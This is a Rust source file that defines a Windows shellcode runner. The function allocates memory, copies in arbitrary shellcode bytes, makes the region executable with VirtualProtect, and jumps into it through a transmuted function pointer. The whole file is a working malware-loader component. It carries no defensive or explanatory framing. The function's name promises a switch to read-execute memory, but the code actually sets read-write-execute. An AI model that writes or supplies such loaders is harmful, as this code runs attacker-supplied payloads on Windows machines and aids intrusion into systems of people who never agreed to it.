use winapi::{
    shared::minwindef::{DWORD, FALSE},
    um::{
        memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect, VirtualQuery},
        winnt::{
            PAGE_READWRITE,
            PAGE_EXECUTE_READ,
            PAGE_EXECUTE_READWRITE,
            MEM_COMMIT,
            MEM_RESERVE,
            MEM_RELEASE,
            MEMORY_BASIC_INFORMATION,
        },
        errhandlingapi::GetLastError,
    },
};
use std::ptr;
use log::{info, warn, error, debug};

pub unsafe fn execute_shellcode_rw_to_rx(shellcode: &[u8]) -> Result<(), &'static str> {
    if shellcode.is_empty() {
        return Err("shellcode 为空");
    }

    let size = shellcode.len();
    let page_size = 4096;
    let alloc_size = (size + page_size - 1) / page_size * page_size;

    simple_logger::init().unwrap();

    // debug!("[*] 请求分配内存大小: {} 字节", shellcode.len());
    // info!("[*] 实际分配: {} 字节 (页对齐)", alloc_size);

    let mem = VirtualAlloc(
        std::ptr::null_mut(),
        alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if mem.is_null() {
        let err = GetLastError();
        return Err("内存分配失败");
    }

    let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    if VirtualQuery(mem, &mut mbi, std::mem::size_of::<MEMORY_BASIC_INFORMATION>()) == 0 {
        VirtualFree(mem, 0, MEM_RELEASE);
        return Err("查询内存信息失败");
    }

    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, size);

    let copied = std::slice::from_raw_parts(mem as *const u8, size);
    let expected = &shellcode[..];

    if copied != expected {
        VirtualFree(mem, 0, MEM_RELEASE);
        return Err("数据损坏");
    }


    let mut old_protect: DWORD = 0;
    let protect_success = VirtualProtect(
        mem,
        alloc_size,
        PAGE_EXECUTE_READWRITE, 
        &mut old_protect,
    );

    if protect_success == FALSE {
        let err = GetLastError();
        VirtualFree(mem, 0, MEM_RELEASE);
        return Err("内存保护修改失败");
    }

    let mut mbi_after: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    VirtualQuery(
        mem,
        &mut mbi_after,
        std::mem::size_of::<MEMORY_BASIC_INFORMATION>(), 
    );

    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);


    let entry: extern "C" fn() = std::mem::transmute(mem);
    entry(); 

    VirtualFree(mem, 0, MEM_RELEASE);
    Ok(())
}